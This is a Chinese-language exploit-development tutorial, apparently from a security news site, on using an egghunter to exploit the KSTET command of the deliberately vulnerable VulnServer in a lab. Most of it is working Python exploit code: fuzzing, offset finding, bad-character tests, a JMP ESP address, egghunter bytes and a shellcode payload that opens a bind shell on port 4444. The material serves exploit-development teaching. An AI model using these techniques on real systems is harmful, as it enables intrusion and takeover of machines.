# 跟小黑学漏洞利用开发之egghunter

阅读量 **1130173**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-11-18 15:01:03

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t015c9727782b25b66c.png)

另外一种跳转shellcode利用技术——Egghunter

此篇为漏洞利用开发第三篇，按计划我其实想写关于Unicode或者关于SEH一些其他玩法。但是众多朋友说啥时候写关于egghunter，才使超阶越次有此篇。Egghunter这个技术其实很早就有了。客观点来讲egghunter算漏洞利用非常实用技巧，取名来源于基督教复活节一个寻找彩蛋的游戏。其实原理类似唯独与前面两篇不同我们进行漏洞利用开发过程中绕过有限的缓冲区空间限制。古人云：众里寻他千百度，蓦然回首，那人却在灯火阑珊处，众位看官且听我娓娓道来。

## 1\. 准备

Windows7—Sp1（目标机）

kali-linux（攻击机）

ImmunityDebugger 1.85（调试工具）—x64、OD等动态调试器都可以

VulnServer

需要对了解X86汇编

对python有一定了解

## 2\. 关于egghunter

在常规缓冲区攻击中，很多时候整个缓冲区不会以最佳状态分配到目标程序内存，前面我们已经知道有些字符可能发生偏移或者转换。但是转换不仅限于字符。有时候，由于未知原因，可能会重新分配整个内存空间。有时候缓冲区会被截断，因此我们的shellcode不会进入到可用的空间。在这种情况下，通常可用使用另外一个方式将shellcode传递到程序内存中。例如，通过攻击目标程序不同功能。同时还有一个很常见情况，就是许多应用程序倾向于将用户输入存储在内存中时间超过他本身所需时间。利用这一个情况。我们可以将shellcode传递给前面被截断的程序。但是，剩下问题就是如何触发这个传递shellcode。Egghunter就此诞生，是特定类型的小型shellcode，当用户缓冲区溢出出现被拆分并分配到内存位置部分时可以使用。

Egghunter shellcode 可以搜索进程的整个地址空间，查找特定的字节集。如果找到了该特定的字节集，egghunter
会将执行流执行到它们所驻留的空间。此外，它大约为 40 个字节，可以完全适合部分或部分截断用户缓冲区的情况。egg 本质上是将在较大的 shellcode
中查找的 shellcode，这里有点像渗透测试中一个技巧——“小马拉大马”可以通过在其开始处使用特殊标记将其与其余的内存内容区分开。让我们来看一个
egghunter shellcode 的真实示例，以更好地了解它的工作原理。Egghunter Shellcode 依赖于能够遍历进程内存的系统调用。由于
Windows 上很少有提供此类功能的系统调用，因此可以用几种可能的方式编写
Egghunter。在互联网搜索发现之前已有安全研究员编写的“egghunter”相关技术详细说明。可以通过如下链接访问<http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf>

## 3\. POC攻击

发送5000个字节FUZZ模糊测试KSTET，由于本系列文章主要是专注漏洞利用，关于FUZZ测试后续有时间，在推出相关文章。尽请关注！

    
    
    #!/usr/bin/python
    
    import socket
    
    import sys
    
    evil = "A"*5000
    
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    
    connect=s.connect(('172.16.242.132',9999))
    
    s.send('KSTET ' + evil + '\r\n')
    
    s.recv(1024)
    
    s.send('EXIT\r\n')
    
    s.close

![](https://p4.ssl.qhimg.com/t01add1b9ee85d8c5a8.png)

查看当前缓冲区字符只能放置92个字符。可能没有像之前文章讲shellcode放入后面运行。因为一般shellcode需要355～500个字符，此空间是肯定不够。因此我们需要另辟蹊径。

## 4\. 获取偏移地址

通过前面缓冲区来看，1000个字符足以，因为应用程序也只接受90多字节。使用！mona
pc生成唯一字符串发送至缓冲区，由此得出覆盖EIP覆盖偏移地址。发送此唯一字符串会导致EIP被0x63413363覆盖

![](https://p2.ssl.qhimg.com/t019d12701722ecc433.png)

使用!mona findmsp，发现偏移量是70个字节。

![](https://p1.ssl.qhimg.com/t016eaaed4cda2fbf51.png)

为了验证offset偏移量是否正确，修改如下代码

    
    
    #!/usr/bin/python
    
    import socket
    
    import sys
    
    evil = "A"* 70 + "B" * 4 + "C" * (100-4-4)
    
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    
    connect=s.connect(('172.16.242.132',9999))
    
    s.send('KSTET ' + evil + '\r\n')
    
    s.recv(1024)
    
    s.send('EXIT\r\n')
    
    s.close

如图所示，offset正确，并且EIP被4个B覆盖。这里注意一个问题，在EIP覆盖后ESP指向20字节。这个问题就可能会带来坏字符识别问题，同时需要注意删除空字节(\x00)
所以需要拆分，第一部分从\x01到\x50

## 5\. 拆分坏字符

![](https://p3.ssl.qhimg.com/t0129cb78860543dea1.png)

    
    
    #!/usr/bin/python
    
    import socket
    
    import sys
    
    badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
    
    "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
    
    "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
    
    "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    
    "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50")
    
    
    
    evil = badchars
    
    evil += "C"*(1000-len(evil))
    
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    
    connect=s.connect(('172.16.242.132',9999))
    
    s.send('KSTET ' + evil + '\r\n')
    
    s.recv(1024)
    
    s.send('EXIT\r\n')
    
    s.close

![](https://p3.ssl.qhimg.com/t011da8068f902d8a00.png)

如图所示，未发现坏字符

第二部分\x51到\xa0

![](https://p1.ssl.qhimg.com/t01fc98e9bb690b9bee.png)

第三部分\xa1到\xf0

![](https://p4.ssl.qhimg.com/t012310626cea2472aa.png)

最后部分\xf1到\xff。经过多次检测，发现仅有\x00唯一坏字符

![](https://p5.ssl.qhimg.com/t0163c4856329930da2.png)

## 6\. 寻找ESP

然后，我们使用!mona jmp –r esp 搜索标记JMP ESP指令的地址。发现几十个地址，但是为了利用我选择0x625011AF

![](https://p1.ssl.qhimg.com/t017fbb6287c392bfbc.png)

然后，修改相关代码

    
    
    #!/usr/bin/python
    
    import socket
    
    import sys
    
    #jmp esp 625011AF
    
    esp ="\xAF\x11\x50\x62"
    
    
    
    evil = "A"* 70 + esp + "C" * (100-4-4)
    
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    
    connect=s.connect(('172.16.242.132',9999))
    
    s.send('KSTET ' + evil + '\r\n')
    
    s.recv(1024)
    
    s.send('EXIT\r\n')
    
    s.close

## 7\. 利用跳转完成egghunter

如图所示，地址有效被重定向到C缓冲区。由于空间有限，不得不使用短跳技术。这里我并没有从A开头跳，此决定只跳50个字节，因为egghunter代码一般都有32个字节，保证egghunter运行成功首要条件就是空间足够。短跳的opcode是\XEB,而-50等于0xFFFFFFCE

![](https://p3.ssl.qhimg.com/t01dd80d2c649030333.png)

因此，我过去后跳50个字符指令的opcode为\XEB\EXCC，有些人很好奇为什么明明是CE这里为什么是CC因为opcode占两个字符。

![](https://p2.ssl.qhimg.com/t01d09eb101b5a8d5a8.png)

如图所示，跳转成功，并且相对跳转指令（$）位置，我被重定向到50个字节（$-32Hex）

![](https://p1.ssl.qhimg.com/t01d79ac4f5f6810148.png)

至此，我们生成我们需要的egg hunter，利用MSF-egghunter。如图所示

    
    
    egghunter =  ""
    
    egghunter += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e"
    
    egghunter += "\x3c\x05\x5a\x74\xef\xb8\x68\x61\x63\x6b\x89\xd7"
    
    egghunter += "\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

![](https://p1.ssl.qhimg.com/t0118a6d4c5016d6b8b.png)

当然在使用egghunter之前，必须要确认egg
hunter代码之前偏移（A的数量）。为此我们做一个如图所示计算考虑到20占用一个字节因此需要24个字节（$+18Hex）

![](https://p2.ssl.qhimg.com/t01973e058a29b1676a.png)

如图，为本篇缓冲区利用流程示意图。

![](https://p4.ssl.qhimg.com/t011af86c4983e90ee1.png)

为了测试计算是否正确，执行如下

    
    
    #!/usr/bin/python
    
    import socket
    
    import sys
    
    #jmp esp 625011AF
    
    esp ="\xAF\x11\x50\x62"
    
    opcode ="\xEB\xCC"
    
    egghunter =  ""
    
    egghunter += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e"
    
    egghunter += "\x3c\x05\x5a\x74\xef\xb8\x68\x61\x63\x6b\x89\xd7"
    
    egghunter += "\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
    
    
    
    evil = "A" * 24
    
    evil += egghunter
    
    evil += "A" * (70-len(evil))
    
    evil += esp + opcode
    
    evil += "C" * (1000-len(evil))
    
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    
    connect=s.connect(('172.16.242.132',9999))
    
    s.send('KSTET ' + evil + '\r\n')
    
    s.recv(1024)
    
    s.send('EXIT\r\n')
    
    s.close

![](https://p5.ssl.qhimg.com/t01c170c60d538cfc8a.png)

有效，重定向gghunter代码

然后我们生成我们需要的shellcode

![](https://p0.ssl.qhimg.com/t01238451ad4dcba810.png)

## 8\. 利用其他功能放入Shellcode

由于shellcode不够放入KSTET命令中，因此需要使用开篇所说，该程序的其他命令。STATS命令放置了shellcode。这样，我的shellcode将被放置在内存中的某个位置，并让Egghunter找到它

    
    
    #!/usr/bin/python
    
    import socket
    
    import sys
    
    
    
    ip = "172.16.242.132"
    
    port = 9999
    
    
    
    shellcode =  "hackhack"
    
    shellcode += "\xb8\x85\x10\xa1\xec\xda\xdd\xd9\x74\x24\xf4\x5b"
    
    shellcode += "\x31\xc9\xb1\x53\x31\x43\x12\x83\xc3\x04\x03\xc6"
    
    shellcode += "\x1e\x43\x19\x34\xf6\x01\xe2\xc4\x07\x66\x6a\x21"
    
    shellcode += "\x36\xa6\x08\x22\x69\x16\x5a\x66\x86\xdd\x0e\x92"
    
    shellcode += "\x1d\x93\x86\x95\x96\x1e\xf1\x98\x27\x32\xc1\xbb"
    
    shellcode += "\xab\x49\x16\x1b\x95\x81\x6b\x5a\xd2\xfc\x86\x0e"
    
    shellcode += "\x8b\x8b\x35\xbe\xb8\xc6\x85\x35\xf2\xc7\x8d\xaa"
    
    shellcode += "\x43\xe9\xbc\x7d\xdf\xb0\x1e\x7c\x0c\xc9\x16\x66"
    
    shellcode += "\x51\xf4\xe1\x1d\xa1\x82\xf3\xf7\xfb\x6b\x5f\x36"
    
    shellcode += "\x34\x9e\xa1\x7f\xf3\x41\xd4\x89\x07\xff\xef\x4e"
    
    shellcode += "\x75\xdb\x7a\x54\xdd\xa8\xdd\xb0\xdf\x7d\xbb\x33"
    
    shellcode += "\xd3\xca\xcf\x1b\xf0\xcd\x1c\x10\x0c\x45\xa3\xf6"
    
    shellcode += "\x84\x1d\x80\xd2\xcd\xc6\xa9\x43\xa8\xa9\xd6\x93"
    
    shellcode += "\x13\x15\x73\xd8\xbe\x42\x0e\x83\xd6\xa7\x23\x3b"
    
    shellcode += "\x27\xa0\x34\x48\x15\x6f\xef\xc6\x15\xf8\x29\x11"
    
    shellcode += "\x59\xd3\x8e\x8d\xa4\xdc\xee\x84\x62\x88\xbe\xbe"
    
    shellcode += "\x43\xb1\x54\x3e\x6b\x64\xc0\x36\xca\xd7\xf7\xbb"
    
    shellcode += "\xac\x87\xb7\x13\x45\xc2\x37\x4c\x75\xed\x9d\xe5"
    
    shellcode += "\x1e\x10\x1e\x18\x83\x9d\xf8\x70\x2b\xc8\x53\xec"
    
    shellcode += "\x89\x2f\x6c\x8b\xf2\x05\xc4\x3b\xba\x4f\xd3\x44"
    
    shellcode += "\x3b\x5a\x73\xd2\xb0\x89\x47\xc3\xc6\x87\xef\x94"
    
    shellcode += "\x51\x5d\x7e\xd7\xc0\x62\xab\x8f\x61\xf0\x30\x4f"
    
    shellcode += "\xef\xe9\xee\x18\xb8\xdc\xe6\xcc\x54\x46\x51\xf2"
    
    shellcode += "\xa4\x1e\x9a\xb6\x72\xe3\x25\x37\xf6\x5f\x02\x27"
    
    shellcode += "\xce\x60\x0e\x13\x9e\x36\xd8\xcd\x58\xe1\xaa\xa7"
    
    shellcode += "\x32\x5e\x65\x2f\xc2\xac\xb6\x29\xcb\xf8\x40\xd5"
    
    shellcode += "\x7a\x55\x15\xea\xb3\x31\x91\x93\xa9\xa1\x5e\x4e"
    
    shellcode += "\x6a\xc1\xbc\x5a\x87\x6a\x19\x0f\x2a\xf7\x9a\xfa"
    
    shellcode += "\x69\x0e\x19\x0e\x12\xf5\x01\x7b\x17\xb1\x85\x90"
    
    shellcode += "\x65\xaa\x63\x96\xda\xcb\xa1"
    
    
    
    #jmp esp 625011AF
    
    esp ="\xAF\x11\x50\x62"
    
    opcode ="\xEB\xCC"
    
    egghunter =  ""
    
    egghunter += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e"
    
    egghunter += "\x3c\x05\x5a\x74\xef\xb8\x68\x61\x63\x6b\x89\xd7"
    
    egghunter += "\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
    
    
    
    
    
    evil = "A" * 24
    
    evil += egghunter
    
    evil += "A" * (70-len(evil))
    
    evil += esp + opcode
    
    evil += "C" * (1000-len(evil))
    
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    
    connect=s.connect((ip,port))
    
    s.send("STATS " + shellcode + '\r\n')
    
    s.recv(1024)
    
    s.close
    
    
    
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    
    connect=s.connect((ip,port))
    
    s.send('KSTET ' + evil + '\r\n')
    
    s.recv(1024)
    
    s.send('EXIT\r\n')
    
    s.close

## 9\. 漏洞利用

执行最终的利用代码后，查看shellcode 是否有效

![](https://p0.ssl.qhimg.com/t013503f2f72e8b910e.png)

由于shellcode有效，因此目标机开启4444端口，最好只需要连接获取权限即可

![](https://p5.ssl.qhimg.com/t01fb4cb2808f7499aa.png)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **legend** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/193065](/post/id/193065)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [shellcode](/tag/shellcode)
  * [Egghunter](/tag/Egghunter)

 **+1** __4赞

 __收藏

![](https://p5.ssl.qhimg.com/t0182a0f69b28b84e54.png) legend

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

